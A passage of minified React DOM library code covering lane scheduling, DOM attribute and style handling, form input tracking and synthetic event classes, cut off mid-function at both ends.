te!==0?(g=te&~F,g!==0?D=xo(g):(K&=te,K!==0?D=xo(K):p||(p=te&~u,p!==0&&(D=xo(p))))):(te=g&~F,te!==0?D=xo(te):K!==0?D=xo(K):p||(p=g&~u,p!==0&&(D=xo(p)))),D===0?0:d!==0&&d!==D&&(d&F)===0&&(F=D&-D,p=d&-d,F>=p||F===32&&(p&4194048)!==0)?d:D}function as(u,d){return(u.pendingLanes&~(u.suspendedLanes&~u.pingedLanes)&d)===0}function g0(u,d){switch(u){case 1:case 2:case 4:case 8:case 64:return d+250;case 16:case 32:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return d+5e3;case 4194304:case 8388608:case 16777216:case 33554432:return-1;case 67108864:case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function el(){var u=wr;return wr<<=1,(wr&62914560)===0&&(wr=4194304),u}function Ro(u){for(var d=[],p=0;31>p;p++)d.push(u);return d}function to(u,d){u.pendingLanes|=d,d!==268435456&&(u.suspendedLanes=0,u.pingedLanes=0,u.warmLanes=0)}function eu(u,d,p,g,D,F){var K=u.pendingLanes;u.pendingLanes=p,u.suspendedLanes=0,u.pingedLanes=0,u.warmLanes=0,u.expiredLanes&=p,u.entangledLanes&=p,u.errorRecoveryDisabledLanes&=p,u.shellSuspendCounter=0;var te=u.entanglements,ce=u.expirationTimes,Ae=u.hiddenUpdates;for(p=K&~p;0<p;){var De=31-br(p),Le=1<<De;te[De]=0,ce[De]=-1;var Se=Ae[De];if(Se!==null)for(Ae[De]=null,De=0;De<Se.length;De++){var Pe=Se[De];Pe!==null&&(Pe.lane&=-536870913)}p&=~Le}g!==0&&tu(u,g,0),F!==0&&D===0&&u.tag!==0&&(u.suspendedLanes|=F&~(K&~d))}function tu(u,d,p){u.pendingLanes|=d,u.suspendedLanes&=~d;var g=31-br(d);u.entangledLanes|=d,u.entanglements[g]=u.entanglements[g]|1073741824|p&261930}function ya(u,d){var p=u.entangledLanes|=d;for(u=u.entanglements;p;){var g=31-br(p),D=1<<g;D&d|u[g]&d&&(u[g]|=d),p&=~D}}function ba(u,d){var p=d&-d;return p=(p&42)!==0?1:wa(p),(p&(u.suspendedLanes|d))!==0?0:p}function wa(u){switch(u){case 2:u=1;break;case 8:u=4;break;case 32:u=16;break;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:u=128;break;case 268435456:u=134217728;break;default:u=0}return u}function va(u){return u&=-u,2<u?8<u?(u&134217727)!==0?32:268435456:8:2}function nh(){var u=j.p;return u!==0?u:(u=window.event,u===void 0?32:N$(u.type))}function cs(u,d){var p=j.p;try{return j.p=u,d()}finally{j.p=p}}var no=Math.random().toString(36).slice(2),Ir="__reactFiber$"+no,Jr="__reactProps$"+no,Ds="__reactContainer$"+no,nu="__reactEvents$"+no,tl="__reactListeners$"+no,rh="__reactHandles$"+no,ih="__reactResources$"+no,Po="__reactMarker$"+no;function nl(u){delete u[Ir],delete u[Jr],delete u[nu],delete u[tl],delete u[rh]}function No(u){var d=u[Ir];if(d)return d;for(var p=u.parentNode;p;){if(d=p[Ds]||p[Ir]){if(p=d.alternate,d.child!==null||p!==null&&p.child!==null)for(u=m$(u);u!==null;){if(p=u[Ir])return p;u=m$(u)}return d}u=p,p=u.parentNode}return null}function us(u){if(u=u[Ir]||u[Ds]){var d=u.tag;if(d===5||d===6||d===13||d===31||d===26||d===27||d===3)return u}return null}function Bs(u){var d=u.tag;if(d===5||d===26||d===27||d===6)return u.stateNode;throw Error(r(33))}function oc(u){var d=u[ih];return d||(d=u[ih]={hoistableStyles:new Map,hoistableScripts:new Map}),d}function zr(u){u[Po]=!0}var sh=new Set,y0={};function ac(u,d){Ea(u,d),Ea(u+"Capture",d)}function Ea(u,d){for(y0[u]=d,u=0;u<d.length;u++)sh.add(d[u])}var b0=RegExp("^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$"),w0={},v0={};function gy(u){return Et.call(v0,u)?!0:Et.call(w0,u)?!1:b0.test(u)?v0[u]=!0:(w0[u]=!0,!1)}function oh(u,d,p){if(gy(d))if(p===null)u.removeAttribute(d);else{switch(typeof p){case"undefined":case"function":case"symbol":u.removeAttribute(d);return;case"boolean":var g=d.toLowerCase().slice(0,5);if(g!=="data-"&&g!=="aria-"){u.removeAttribute(d);return}}u.setAttribute(d,""+p)}}function ls(u,d,p){if(p===null)u.removeAttribute(d);else{switch(typeof p){case"undefined":case"function":case"symbol":case"boolean":u.removeAttribute(d);return}u.setAttribute(d,""+p)}}function Xr(u,d,p,g){if(g===null)u.removeAttribute(p);else{switch(typeof g){case"undefined":case"function":case"symbol":case"boolean":u.removeAttribute(p);return}u.setAttributeNS(d,p,""+g)}}function Ei(u){switch(typeof u){case"bigint":case"boolean":case"number":case"string":case"undefined":return u;case"object":return u;default:return""}}function ru(u){var d=u.type;return(u=u.nodeName)&&u.toLowerCase()==="input"&&(d==="checkbox"||d==="radio")}function E0(u,d,p){var g=Object.getOwnPropertyDescriptor(u.constructor.prototype,d);if(!u.hasOwnProperty(d)&&typeof g<"u"&&typeof g.get=="function"&&typeof g.set=="function"){var D=g.get,F=g.set;return Object.defineProperty(u,d,{configurable:!0,get:function(){return D.call(this)},set:function(K){p=""+K,F.call(this,K)}}),Object.defineProperty(u,d,{enumerable:g.enumerable}),{getValue:function(){return p},setValue:function(K){p=""+K},stopTracking:function(){u._valueTracker=null,delete u[d]}}}}function Fn(u){if(!u._valueTracker){var d=ru(u)?"checked":"value";u._valueTracker=E0(u,d,""+u[d])}}function rl(u){if(!u)return!1;var d=u._valueTracker;if(!d)return!0;var p=d.getValue(),g="";return u&&(g=ru(u)?u.checked?"true":"false":u.value),u=g,u!==p?(d.setValue(u),!0):!1}function cc(u){if(u=u||(typeof document<"u"?document:void 0),typeof u>"u")return null;try{return u.activeElement||u.body}catch{return u.body}}var dd=/[\n"\\]/g;function js(u){return u.replace(dd,function(d){return"\\"+d.charCodeAt(0).toString(16)+" "})}function ah(u,d,p,g,D,F,K,te){u.name="",K!=null&&typeof K!="function"&&typeof K!="symbol"&&typeof K!="boolean"?u.type=K:u.removeAttribute("type"),d!=null?K==="number"?(d===0&&u.value===""||u.value!=d)&&(u.value=""+Ei(d)):u.value!==""+Ei(d)&&(u.value=""+Ei(d)):K!=="submit"&&K!=="reset"||u.removeAttribute("value"),d!=null?ch(u,K,Ei(d)):p!=null?ch(u,K,Ei(p)):g!=null&&u.removeAttribute("value"),D==null&&F!=null&&(u.defaultChecked=!!F),D!=null&&(u.checked=D&&typeof D!="function"&&typeof D!="symbol"),te!=null&&typeof te!="function"&&typeof te!="symbol"&&typeof te!="boolean"?u.name=""+Ei(te):u.removeAttribute("name")}function yy(u,d,p,g,D,F,K,te){if(F!=null&&typeof F!="function"&&typeof F!="symbol"&&typeof F!="boolean"&&(u.type=F),d!=null||p!=null){if(!(F!=="submit"&&F!=="reset"||d!=null)){Fn(u);return}p=p!=null?""+Ei(p):"",d=d!=null?""+Ei(d):p,te||d===u.value||(u.value=d),u.defaultValue=d}g=g??D,g=typeof g!="function"&&typeof g!="symbol"&&!!g,u.checked=te?u.checked:!!g,u.defaultChecked=!!g,K!=null&&typeof K!="function"&&typeof K!="symbol"&&typeof K!="boolean"&&(u.name=K),Fn(u)}function ch(u,d,p){d==="number"&&cc(u.ownerDocument)===u||u.defaultValue===""+p||(u.defaultValue=""+p)}function il(u,d,p,g){if(u=u.options,d){d={};for(var D=0;D<p.length;D++)d["$"+p[D]]=!0;for(p=0;p<u.length;p++)D=d.hasOwnProperty("$"+u[p].value),u[p].selected!==D&&(u[p].selected=D),D&&g&&(u[p].defaultSelected=!0)}else{for(p=""+Ei(p),d=null,D=0;D<u.length;D++){if(u[D].value===p){u[D].selected=!0,g&&(u[D].defaultSelected=!0);return}d!==null||u[D].disabled||(d=u[D])}d!==null&&(d.selected=!0)}}function by(u,d,p){if(d!=null&&(d=""+Ei(d),d!==u.value&&(u.value=d),p==null)){u.defaultValue!==d&&(u.defaultValue=d);return}u.defaultValue=p!=null?""+Ei(p):""}function iu(u,d,p,g){if(d==null){if(g!=null){if(p!=null)throw Error(r(92));if(P(g)){if(1<g.length)throw Error(r(93));g=g[0]}p=g}p==null&&(p=""),d=p}p=Ei(d),u.defaultValue=p,g=u.textContent,g===p&&g!==""&&g!==null&&(u.value=g),Fn(u)}function Ms(u,d){if(d){var p=u.firstChild;if(p&&p===u.lastChild&&p.nodeType===3){p.nodeValue=d;return}}u.textContent=d}var wy=new Set("animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(" "));function _0(u,d,p){var g=d.indexOf("--")===0;p==null||typeof p=="boolean"||p===""?g?u.setProperty(d,""):d==="float"?u.cssFloat="":u[d]="":g?u.setProperty(d,p):typeof p!="number"||p===0||wy.has(d)?d==="float"?u.cssFloat=p:u[d]=(""+p).trim():u[d]=p+"px"}function A0(u,d,p){if(d!=null&&typeof d!="object")throw Error(r(62));if(u=u.style,p!=null){for(var g in p)!p.hasOwnProperty(g)||d!=null&&d.hasOwnProperty(g)||(g.indexOf("--")===0?u.setProperty(g,""):g==="float"?u.cssFloat="":u[g]="");for(var D in d)g=d[D],d.hasOwnProperty(D)&&p[D]!==g&&_0(u,D,g)}else for(var F in d)d.hasOwnProperty(F)&&_0(u,F,d[F])}function uh(u){if(u.indexOf("-")===-1)return!1;switch(u){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var vy=new Map([["acceptCharset","accept-charset"],["htmlFor","for"],["httpEquiv","http-equiv"],["crossOrigin","crossorigin"],["accentHeight","accent-height"],["alignmentBaseline","alignment-baseline"],["arabicForm","arabic-form"],["baselineShift","baseline-shift"],["capHeight","cap-height"],["clipPath","clip-path"],["clipRule","clip-rule"],["colorInterpolation","color-interpolation"],["colorInterpolationFilters","color-interpolation-filters"],["colorProfile","color-profile"],["colorRendering","color-rendering"],["dominantBaseline","dominant-baseline"],["enableBackground","enable-background"],["fillOpacity","fill-opacity"],["fillRule","fill-rule"],["floodColor","flood-color"],["floodOpacity","flood-opacity"],["fontFamily","font-family"],["fontSize","font-size"],["fontSizeAdjust","font-size-adjust"],["fontStretch","font-stretch"],["fontStyle","font-style"],["fontVariant","font-variant"],["fontWeight","font-weight"],["glyphName","glyph-name"],["glyphOrientationHorizontal","glyph-orientation-horizontal"],["glyphOrientationVertical","glyph-orientation-vertical"],["horizAdvX","horiz-adv-x"],["horizOriginX","horiz-origin-x"],["imageRendering","image-rendering"],["letterSpacing","letter-spacing"],["lightingColor","lighting-color"],["markerEnd","marker-end"],["markerMid","marker-mid"],["markerStart","marker-start"],["overlinePosition","overline-position"],["overlineThickness","overline-thickness"],["paintOrder","paint-order"],["panose-1","panose-1"],["pointerEvents","pointer-events"],["renderingIntent","rendering-intent"],["shapeRendering","shape-rendering"],["stopColor","stop-color"],["stopOpacity","stop-opacity"],["strikethroughPosition","strikethrough-position"],["strikethroughThickness","strikethrough-thickness"],["strokeDasharray","stroke-dasharray"],["strokeDashoffset","stroke-dashoffset"],["strokeLinecap","stroke-linecap"],["strokeLinejoin","stroke-linejoin"],["strokeMiterlimit","stroke-miterlimit"],["strokeOpacity","stroke-opacity"],["strokeWidth","stroke-width"],["textAnchor","text-anchor"],["textDecoration","text-decoration"],["textRendering","text-rendering"],["transformOrigin","transform-origin"],["underlinePosition","underline-position"],["underlineThickness","underline-thickness"],["unicodeBidi","unicode-bidi"],["unicodeRange","unicode-range"],["unitsPerEm","units-per-em"],["vAlphabetic","v-alphabetic"],["vHanging","v-hanging"],["vIdeographic","v-ideographic"],["vMathematical","v-mathematical"],["vectorEffect","vector-effect"],["vertAdvY","vert-adv-y"],["vertOriginX","vert-origin-x"],["vertOriginY","vert-origin-y"],["wordSpacing","word-spacing"],["writingMode","writing-mode"],["xmlnsXlink","xmlns:xlink"],["xHeight","x-height"]]),sl=/^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;function ol(u){return sl.test(""+u)?"javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')":u}function _a(){}var C0=null;function Oo(u){return u=u.target||u.srcElement||window,u.correspondingUseElement&&(u=u.correspondingUseElement),u.nodeType===3?u.parentNode:u}var al=null,uc=null;function lc(u){var d=us(u);if(d&&(u=d.stateNode)){var p=u[Jr]||null;e:switch(u=d.stateNode,d.type){case"input":if(ah(u,p.value,p.defaultValue,p.defaultValue,p.checked,p.defaultChecked,p.type,p.name),d=p.name,p.type==="radio"&&d!=null){for(p=u;p.parentNode;)p=p.parentNode;for(p=p.querySelectorAll('input[name="'+js(""+d)+'"][type="radio"]'),d=0;d<p.length;d++){var g=p[d];if(g!==u&&g.form===u.form){var D=g[Jr]||null;if(!D)throw Error(r(90));ah(g,D.value,D.defaultValue,D.defaultValue,D.checked,D.defaultChecked,D.type,D.name)}}for(d=0;d<p.length;d++)g=p[d],g.form===u.form&&rl(g)}break e;case"textarea":by(u,p.value,p.defaultValue);break e;case"select":d=p.value,d!=null&&il(u,!!p.multiple,d,!1)}}}var lh=!1;function cl(u,d,p){if(lh)return u(d,p);lh=!0;try{var g=u(d);return g}finally{if(lh=!1,(al!==null||uc!==null)&&(n3(),al&&(d=al,u=uc,uc=al=null,lc(d),u)))for(d=0;d<u.length;d++)lc(u[d])}}function Aa(u,d){var p=u.stateNode;if(p===null)return null;var g=p[Jr]||null;if(g===null)return null;p=g[d];e:switch(d){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(g=!g.disabled)||(u=u.type,g=!(u==="button"||u==="input"||u==="select"||u==="textarea")),u=!g;break e;default:u=!1}if(u)return null;if(p&&typeof p!="function")throw Error(r(231,d,typeof p));return p}var ko=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),fd=!1;if(ko)try{var Wn={};Object.defineProperty(Wn,"passive",{get:function(){fd=!0}}),window.addEventListener("test",Wn,Wn),window.removeEventListener("test",Wn,Wn)}catch{fd=!1}var ul=null,xw=null,S0=null;function Iw(){if(S0)return S0;var u,d=xw,p=d.length,g,D="value"in ul?ul.value:ul.textContent,F=D.length;for(u=0;u<p&&d[u]===D[u];u++);var K=p-u;for(g=1;g<=K&&d[p-g]===D[F-g];g++);return S0=D.slice(u,1<g?1-g:void 0)}function T0(u){var d=u.keyCode;return"charCode"in u?(u=u.charCode,u===0&&d===13&&(u=13)):u=d,u===10&&(u=13),32<=u||u===13?u:0}function hd(){return!0}function su(){return!1}function ds(u){function d(p,g,D,F,K){this._reactName=p,this._targetInst=D,this.type=g,this.nativeEvent=F,this.target=K,this.currentTarget=null;for(var te in u)u.hasOwnProperty(te)&&(p=u[te],this[te]=p?p(F):F[te]);return this.isDefaultPrevented=(F.defaultPrevented!=null?F.defaultPrevented:F.returnValue===!1)?hd:su,this.isPropagationStopped=su,this}return h(d.prototype,{preventDefault:function(){this.defaultPrevented=!0;var p=this.nativeEvent;p&&(p.preventDefault?p.preventDefault():typeof p.returnValue!="unknown"&&(p.returnValue=!1),this.isDefaultPrevented=hd)},stopPropagation:function(){var p=this.nativeEvent;p&&(p.stopPropagation?p.stopPropagation():typeof p.cancelBubble!="unknown"&&(p.cancelBubble=!0),this.isPropagationStopped=hd)},persist:function(){},isPersistent:hd}),d}var pd={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(u){return u.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},ll=ds(pd),dh=h({},pd,{view:0,detail:0}),Rw=ds(dh),fh,Ey,dl,_y=h({},dh,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:hh,button:0,buttons:0,relatedTarget:function(u){return u.relatedTarget===void 0?u.fromElement===u.srcElement?u.toElement:u.fromElement:u.relatedTarget},movementX:function(u){return"movementX"in u?u.movementX:(u!==dl&&(dl&&u.type==="mousemove"?(fh=u.screenX-dl.screenX,Ey=u.screenY-dl.screenY):Ey=fh=0,dl=u),fh)},movementY:function(u){return"movementY"in u?u.movementY:Ey}}),Pw=ds(_y),x0=h({},_y,{dataTransfer:0}),l5=ds(x0),d5=h({},dh,{relatedTarget:0}),I0=ds(d5),Nw=h({},pd,{animationName:0,elapsedTime:0,pseudoElement:0}),f5=ds(Nw),Ay=h({},pd,{clipboardData:function(u){return"clipboardData"in u?u.clipboardData:window.clipboardData}}),h5=ds(Ay),p5=h({},pd,{data:0}),fl=ds(p5),m5={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},g5={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},y5={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function b5(u){var d=this.nativeEvent;return d.getModifierState?d.getModifierState(u):(u=y5[u])?!!d[u]:!1}function hh(){return b5}var ro=h({},dh,{key:function(u){if(u.key){var d=m5[u.key]||u.key;if(d!=="Unidentified")return d}return u.type==="keypress"?(u=T0(u),u===13?"Enter":String.fromCharCode(u)):u.type==="keydown"||u.type==="keyup"?g5[u.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:hh,charCode:function(u){return u.type==="keypress"?T0(u):0},keyCode:function(u){return u.type==="keydown"||u.type==="keyup"?u.keyCode:0},which:function(u){return u.type==="keypress"?T0(u):u.type==="keydown"||u.type==="keyup"?u.keyCode:0}}),w5=ds(ro),v5=h({},_y,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),md=ds(v5),x=h({},dh,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:hh}),W=ds(x),Q=h({},pd,{propertyName:0,elapsedTime:0,pseudoElement:0}),se=ds(Q),ve=h({},_y,{deltaX:function(u){return"deltaX"in u?u.deltaX:"wheelDeltaX"in u?-u.wheelDeltaX:0},deltaY:function(u){return"deltaY"in u?u.deltaY:"wheelDeltaY"in u?-u.wheelDeltaY:"wheelDelta"in u?-u.wheelDelta:0},deltaZ:0,deltaMode:0}),Ie=ds(ve),Je=h({},pd,{newState:0,oldState:0}),Zt=ds(Je),li=[9,13,27,32],$n=ko&&"CompositionEvent"in window,Dr=null;ko&&"documentMode"in document&&(Dr=document.documentMode);var dc=ko&&"TextEvent"in window&&!Dr,hl=ko&&(!$n||Dr&&8<Dr&&11>=Dr),ou=" ",au=!1;function R0(u,d){switch(u){case"keyup":return li.indexOf(d.keyCode)!==-1;case"keydown":return d.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function Cy(u){return u=u.detail,typeof u=="object"&&"data"in u?u.data:null}var Sy=!1;function jhe(u,d){switch(u){case"compositionend":return Cy(d);case"keypress":return d.which!==32?null:(au=!0,ou);case"textInput":return u=d.data,u===ou&&au?null:u;default:return null}}function Mhe(u,d){if(Sy)return u==="compositionend"||!$n&&R0(u,d)?(u=Iw(),S0=xw=ul=null,Sy=!1,u):null;switch(u){case"paste":return null;case"keypress":if(!(d.ctrlKey||d.altKey||d.metaKey)||d.ctrlKey&&d.altKey){if(d.char&&1<d.char.length)return d.char;if(d.which)return String.fromCharCode(d.which)}return null;case"compositionend":return hl&&d.locale!=="ko"?null:d.data;default:return null}}var Uhe={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function bU(u){var d=u&&u.nodeName&&u.nodeName.toLowerCase();return d==="input"?!!Uhe[u.type]:d==="textarea"}function wU(u,d,p,g){al?uc?uc.push(g):uc=[g]:al=g,d=u3(d,"onChange"),0<d.length&&(p=new ll("onChange","change",null,p,g),u.push({event:p,listeners:d}))}var Ow=null,kw=null;function Lhe(u){t$(u,0)}function E5(u){var d=Bs(u);if(rl(d))return u}function vU(u,d){if(u==="change")return d}var EU=!1;if(ko){var CR;if(ko){var SR="oninput"in document;if(!SR){var _U=document.createElement("div");_U.setAttribute("oninput","return;"),SR=typeof _U.oninput=="function"}CR=SR}else CR=!1;EU=CR&&(!document.documentMode||9<document.documentMode)}function AU(){Ow&&(Ow.detachEvent("onpropertychange",CU),kw=Ow=null)}function CU(u){if(u.propertyName==="value"&&E5(kw)){var d=[];wU(d,kw,u,Oo(u)),cl(Lhe,d)}}function Fhe(u,d,p){u==="focusin"?(AU(),Ow=d,kw=p,Ow.attachEvent("onpropertychange",CU)):u==="focusout"&&AU()}function $he(u){if(u==="selectionchange"||u==="keyup"||u==="keydown")return E5(kw)}function Hhe(u,d){if(u==="click")return E5(d)}function zhe(u,d){if(u==="input"||u==="change")return E5(d)}function qhe(u,d){return u===d&&(u!==0||1/u===1/d)||u!==u&&d!==d}var Ca=typeof Object.is=="function"?Object.is:qhe;function Dw(u,d){if(Ca(u,d))return!0;if(typeof u!="object"||u===null||typeof d!="object"||d===null)return!1;var p=Object.keys(u),g=Object.keys(d);if(p.length!==g.length)return!1;for(g=0;g<p.length;g++){var D=p[g];if(!Et.call(d,D)||!Ca(u[D],d[D]))return!1}return!0}function SU(u){for(;u&&u.firstChild;)u=u.firstChild;return u}function TU(u,d){var p=SU(u);u=0;for(var g;p;){if(p.nodeType===3){if(g=u+p.textContent.length,u<=d&&g>=d)return{node:p,offset:d-u};u=g}e:{for(;p;){if(p.nextSibling){p=p.nextSibling;break e}p=p.parentNode}p=void 0}p=SU(p)}}function xU(u,d){return u&&d?u===d?!0:u&&u.nodeType===3?!1:d&&d.nodeType===3?xU(u,d.parentNode):"contains"in u?u.contains(d):u.compareDocumentPosition?!!(u.compareDocumentPosition(d)&16):!1:!1}function IU(u){u=u!=null&&u.ownerDocument!=null&&u.ownerDocument.defaultView!=null?u.ownerDocument.defaultView:window;for(var d=cc(u.document);d instanceof u.HTMLIFrameElement;){try{var p=typeof d.contentWindow.location.href=="string"}catch{p=!1}if(p)u=d.contentWindow;else break;d=cc(u.document)}return d}function TR(u){var d=u&&u.nodeName&&u.nodeName.toLowerCase();return d&&(d==="input"&&(u.type==="text"||u.type==="search"||u.type==="tel"||u.type==="url"||u.type==="password")||d==="textarea"||u.contentEditable==="true")}var Vhe=ko&&"documentMode"in document&&11>=document.documentMode,Ty=null,xR=null,Bw=null,IR=!1;function RU(u,d,p){var g=p.window===p?p.document:p.nodeType===9?p:p.ownerDocument;IR||Ty==null||Ty!==cc(g)||(g=Ty,"selectionStart"in g&&TR(g)?g={start:g.selectionStart,end:g.selectionEnd}:(g=(g.ownerDocument&&g.ownerDocument.defaultView||window).getSelection(),g={anchorNode:g.anchorNode,anchorOffset:g.anchorOffset,focusNode:g.focusNode,focusOffset:g.focusOffset}),Bw&&Dw(Bw,g)||(Bw=g,g=u3(xR,"onSelect"),0<g.length&&(d=new ll("onSelect","select",null,d,p),u.push({event:d,listeners:g}),d.target=Ty)))}function P0(u,d){var p={};return p[u.toLowerCase()]=d.toLowerCase(),p["Webkit"+u]="webkit"+d,p["Moz"+u]="moz"+d,p}var xy={animationend:P0("Animation","AnimationEnd"),animationiteration:P0("Animation","AnimationIteration"),animationstart:P0("Animation","AnimationStart"),transitionrun:P0("Transition","TransitionRun"),transitionstart:P0("Transition","TransitionStart"),transitioncancel:P0("Transition","TransitionCancel"),transitionend:P0("Transition","TransitionEnd")},RR={},PU={};ko&&(PU=document.createElement("div").style,"AnimationEvent"in window||(delete xy.animationend.animation,delete xy.animationiteration.animation,delete xy.animationstart.animation),"TransitionEvent"in window||delete xy.transitionend.transition);function N0(u){if(RR[u])return RR[u];if(!xy[u])return u;var d=xy[u],p;for(p in d)if(d.hasOwnProperty(p)&&p in PU)return RR[u]=d[p];return u}var NU=N0("animationend"),OU=N0("animationiteration"),kU=N0("animationstart"),Whe=N0("transitionrun"),Ghe=N0("transitionstart"),Khe=N0("transitioncancel"),DU=N0("transitionend"),BU=new Map,PR="abort auxClick beforeToggle cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");PR.push("scrollEnd");function cu(u,d){BU.set(u,d),ac(d,[u])}var _5=typeof reportError=="function"?reportError:function(u){if(typeof window=="object"&&typeof window.ErrorEvent=="function"){var d=new window.ErrorEvent("error",{bubbles:!0,cancelable:!0,message:typeof u=="object"&&u!==null&&typeof u.message=="string"?String(u.message):String(u),error:u});if(!window.dispatchEvent(d))return}else if(typeof process=="object"&&typeof process.emit=="function"){process.emit("uncaughtException",u);return}console.error(u)},fc=[],Iy=0,NR=0;function A5(){for(var u=Iy,d=NR=Iy=0;d<u;){var p=fc[d];fc[d++]=null;var g=fc[d];fc[d++]=null;var D=fc[d];fc[d++]=null;var F=fc[d];if(fc[d++]=null,g!==null&&D!==null){var K=g.pending;K===null?D.next=D:(D.next=K.next,K.next=D),g.pending=D}F!==0&&jU(p,D,F)}}function C5(u,d,p,g){fc[Iy++]=u,fc[Iy++]=d,fc[Iy++]=p,fc[Iy++]=g,NR|=g,u.lanes|=g,u=u.alternate,u!==null&&(u.lanes|=g)}function OR(u,d,p,g){return C5(u,d,p,g),S5(u)}function O0(u,d){return C5(u,null,null,d),S5(u)}function jU(u,d,p){u.lanes|=p;var g=u.alternate;g!==null&&(g.lanes|=p);for(var D=!1,F=u.return;F!==null;)F.childLanes|=p,g=F.alternate,g!==null&&(g.childLanes|=p),F.tag===22&&(u=F.stateNode,u===null||u._visibility&1||(D=!0)),u=F,F=F.return;return u.tag===3?(F=u.stateNode,D&&d!==null&&(D=31-br(p),u=F.hiddenUpdates,g=u[D],g===null?u[D]=[d]:g.push(d),d.lane=p|536870912),F):null}function S5(u){if(50<rv)throw rv=0,$P=null,Error(r(185));for(var d=u.return;d!==null;)u=d,d=u.return;return u.tag===3?u.stateNode:null}var Ry={};function Zhe(u,d,p,g){this.tag=u,this.key=p,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.refCleanup=this.ref=null,this.pendingProps=d,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=g,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function Sa(u,d,p,g){return new Zhe(u,d,p,g)}function kR(u){return u=u.prototype,!(!u||!u.isReactComponent)}function gd(u,d){var p=u.alternate;return 